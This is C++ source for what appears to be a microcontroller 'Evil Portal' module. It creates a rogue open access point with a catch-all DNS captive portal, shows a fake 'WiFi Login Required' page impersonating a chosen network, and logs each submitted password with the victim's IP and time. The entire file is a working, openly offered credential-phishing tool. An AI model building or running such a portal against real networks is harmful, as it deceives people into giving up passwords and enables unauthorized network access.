#include "evil_portal_module.h"

void EvilPortalModule::setup() {
    Serial.println("[Evil Portal] Module initialized");
}

void EvilPortalModule::loop() {
    if (portalActive && dnsServer && webServer) {
        dnsServer->processNextRequest();
        webServer->handleClient();
    }
}

bool EvilPortalModule::startPortal(const String& ssid, const String& targetSSID) {
    if (portalActive) {
        Serial.println("[Evil Portal] Portal already running");
        return false;
    }
    
    portalSSID = ssid;
    this->targetSSID = targetSSID.length() > 0 ? targetSSID : ssid;
    
    Serial.printf("[Evil Portal] Starting captive portal: %s\n", portalSSID.c_str());
    
    // Configure Access Point
    WiFi.mode(WIFI_AP);
    WiFi.softAP(portalSSID.c_str());
    
    IPAddress apIP(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.softAPConfig(apIP, gateway, subnet);
    
    // Start DNS server (captive portal)
    dnsServer = new DNSServer();
    dnsServer->start(53, "*", apIP);
    
    // Start web server
    webServer = new WebServer(80);
    
    // Setup routes
    webServer->on("/", [this]() { handleRoot(); });
    webServer->on("/post", HTTP_POST, [this]() { handlePost(); });
    webServer->on("/success", [this]() { handleSuccess(); });
    webServer->onNotFound([this]() { handleNotFound(); });
    
    webServer->begin();
    
    portalActive = true;
    
    Serial.printf("[Evil Portal] Portal active at %s\n", WiFi.softAPIP().toString().c_str());
    Serial.printf("[Evil Portal] Target SSID: %s\n", this->targetSSID.c_str());
    
    return true;
}

void EvilPortalModule::stopPortal() {
    if (!portalActive) return;
    
    Serial.println("[Evil Portal] Stopping portal");
    
    if (webServer) {
        webServer->stop();
        delete webServer;
        webServer = nullptr;
    }
    
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    
    portalActive = false;
    
    Serial.printf("[Evil Portal] Captured %d credentials\n", credentials.size());
}

void EvilPortalModule::handleRoot() {
    webServer->send(200, "text/html", getLoginPage());
}

void EvilPortalModule::handlePost() {
    if (webServer->hasArg("password")) {
        String password = webServer->arg("password");
        captureCredential(password);
        webServer->sendHeader("Location", "/success");
        webServer->send(302, "text/plain", "");
    } else {
        webServer->send(400, "text/plain", "Bad Request");
    }
}

void EvilPortalModule::handleSuccess() {
    webServer->send(200, "text/html", getSuccessPage());
}

void EvilPortalModule::handleNotFound() {
    // Redirect all unknown paths to login page (captive portal behavior)
    webServer->sendHeader("Location", "/");
    webServer->send(302, "text/plain", "");
}

String EvilPortalModule::getLoginPage() {
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<title>Sign in to Network</title>";
    html += "<style>";
    html += "body{font-family:Arial,sans-serif;background:#f0f0f0;margin:0;padding:20px;}";
    html += ".container{max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
    html += "h2{text-align:center;color:#333;margin-bottom:30px;}";
    html += ".network{background:#f5f5f5;padding:15px;border-radius:5px;margin-bottom:20px;text-align:center;font-weight:bold;}";
    html += "input[type=password]{width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;margin-bottom:15px;box-sizing:border-box;font-size:16px;}";
    html += "button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:16px;font-weight:bold;}";
    html += "button:hover{background:#0056b3;}";
    html += ".info{text-align:center;color:#666;font-size:12px;margin-top:20px;}";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<h2>WiFi Login Required</h2>";
    html += "<div class='network'>Network: " + targetSSID + "</div>";
    html += "<form action='/post' method='POST'>";
    html += "<input type='password' name='password' placeholder='Enter WiFi password' required autofocus>";
    html += "<button type='submit'>Connect</button>";
    html += "</form>";
    html += "<div class='info'>Enter the network password to connect</div>";
    html += "</div></body></html>";
    
    return html;
}

String EvilPortalModule::getSuccessPage() {
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<meta http-equiv='refresh' content='3;url=/'>"; // Redirect back after 3s
    html += "<title>Connecting...</title>";
    html += "<style>";
    html += "body{font-family:Arial,sans-serif;background:#f0f0f0;margin:0;padding:20px;}";
    html += ".container{max-width:400px;margin:100px auto;background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;}";
    html += "h2{color:#28a745;margin-bottom:20px;}";
    html += ".spinner{border:4px solid #f3f3f3;border-top:4px solid #007bff;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:20px auto;}";
    html += "@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}";
    html += "p{color:#666;}";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<h2>✓ Connecting to Network</h2>";
    html += "<div class='spinner'></div>";
    html += "<p>Please wait while we connect you to " + targetSSID + "...</p>";
    html += "</div></body></html>";
    
    return html;
}

void EvilPortalModule::captureCredential(const String& password) {
    CapturedCredential cred;
    cred.ssid = targetSSID;
    cred.password = password;
    cred.timestamp = getCurrentTimestamp();
    cred.clientIP = webServer->client().remoteIP();
    
    credentials.push_back(cred);
    
    Serial.println("\n[Evil Portal] ===== CREDENTIAL CAPTURED =====");
    Serial.printf("[Evil Portal] SSID: %s\n", cred.ssid.c_str());
    Serial.printf("[Evil Portal] Password: %s\n", cred.password.c_str());
    Serial.printf("[Evil Portal] Client IP: %s\n", cred.clientIP.toString().c_str());
    Serial.printf("[Evil Portal] Time: %s\n", cred.timestamp.c_str());
    Serial.printf("[Evil Portal] Total captured: %d\n", credentials.size());
    Serial.println("[Evil Portal] =============================\n");
}

void EvilPortalModule::clearCredentials() {
    credentials.clear();
    Serial.println("[Evil Portal] Credentials cleared");
}

String EvilPortalModule::getCurrentTimestamp() {
    unsigned long seconds = millis() / 1000;
    unsigned long minutes = seconds / 60;
    unsigned long hours = minutes / 60;
    
    seconds = seconds % 60;
    minutes = minutes % 60;
    hours = hours % 24;
    
    char timestamp[20];
    sprintf(timestamp, "%02lu:%02lu:%02lu", hours, minutes, seconds);
    
    return String(timestamp);
}
